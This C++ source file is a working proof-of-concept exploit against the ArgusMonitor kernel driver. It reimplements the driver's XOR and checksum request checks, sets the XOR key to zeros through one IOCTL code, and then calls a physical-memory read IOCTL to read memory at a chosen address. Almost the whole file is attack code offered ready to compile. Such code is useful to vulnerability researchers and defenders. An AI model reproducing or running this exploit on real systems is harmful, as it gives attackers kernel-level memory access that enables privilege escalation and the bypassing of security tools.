#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <cstdint>
#include <iomanip>

HANDLE hDevice;
unsigned char xor_key[510] = {};

#define IOCTL_SETUP_XOR 0x9C4034D8
#define IOCTL_READ_PHYS 0x9C40340C

/* the function copy that used in driver to validate xor and checksum checks, for test */
bool sub_14000389C(uint8_t* a1, int a2, char a3)
{
    int16_t v3 = 0;
    unsigned int v6;
    unsigned short i;
    unsigned short v10 = 0;
    unsigned int v9 = a2 - 2;

    if (a2 == 0) {
        return true;
    }

    if (a3 == 1) {
        v6 = a2 - 2;
        for (i = 0; i < v6; i++)
        {
            a1[i] ^= xor_key[i];
        }
    }

    if (a2 != 2) {
        for (i = 0; i < v9; i++) {
            v3 += a1[i];
        }
    }

    return (a1[v9] == (v3 >> 8) && a1[v9 + 1] == (v3 & 0xFF));
}

bool xor_buffer(uint8_t* buffer, int size)
{
    unsigned int v6 = size - 2;
    for (unsigned short i = 0; i < v6; i++)
    {
        buffer[i] ^= xor_key[i];
    }

    return true;
}

bool checksum_buffer(uint8_t* buffer, int size)
{
    unsigned int v6 = size - 2;

    int16_t checksum = 0;
    for (unsigned short i = 0; i < v6; i++)
    {
        checksum += buffer[i];
    }

    buffer[v6] = (checksum >> 8) & 0xFF;
    buffer[v6 + 1] = checksum & 0xFF;

    return true;
}

bool open_device()
{
    hDevice = CreateFile(
        L"\\\\.\\ArgusMonitorCTLD",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Error opening device: " << GetLastError() << std::endl;
        return false;
    }

    return true;
}

bool send_xor_key()
{
    uint8_t input[0x200];
    uint8_t output[0x210];

    for (int i = 0; i < sizeof(input); i++)
    {
        input[i] = 0;
    }

    if (!checksum_buffer(input, sizeof(input)))
    {
        printf("cant checksum buffer\n");
        return false;
    }

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_SETUP_XOR,
        &input,
        sizeof(input),
        &output,
        sizeof(output),
        &bytesReturned,
        nullptr);

    if (!result)
    {
        if (GetLastError() == 1117)
        {
            return true;
        }
        std::cerr << "IOCTL error: " << std::hex << GetLastError() << std::endl;
        CloseHandle(hDevice);
        return false;
    }

    return true;
}

ULONG64 read_mem(ULONG address)
{
    uint8_t input[0x18];
    uint8_t output[0x610];

    memset(input, 0, sizeof(input));
    memset(output, 0, sizeof(output));

    *reinterpret_cast<ULONG*>(input) = address;
    *reinterpret_cast<ULONG*>(input + 4) = sizeof(ULONG64);

    checksum_buffer(input, sizeof(input));
    xor_buffer(input, sizeof(input));

    DWORD bytesReturned = 0;
    DeviceIoControl(
        hDevice,
        IOCTL_READ_PHYS,
        &input,
        sizeof(input),
        &output,
        sizeof(output),
        &bytesReturned,
        nullptr);

    xor_buffer(output, sizeof(output));

    return *reinterpret_cast<ULONG64*>(output);
}


int main()
{
    memset(xor_key, 0, sizeof(xor_key));

    if (!open_device())
    {
        return 1;
    }

    if (!send_xor_key())
    {
        return 1;
    }

    ULONG64 read = read_mem(0x40);

    std::cout << std::hex << read << std::endl;

    CloseHandle(hDevice);
    return 0;
}
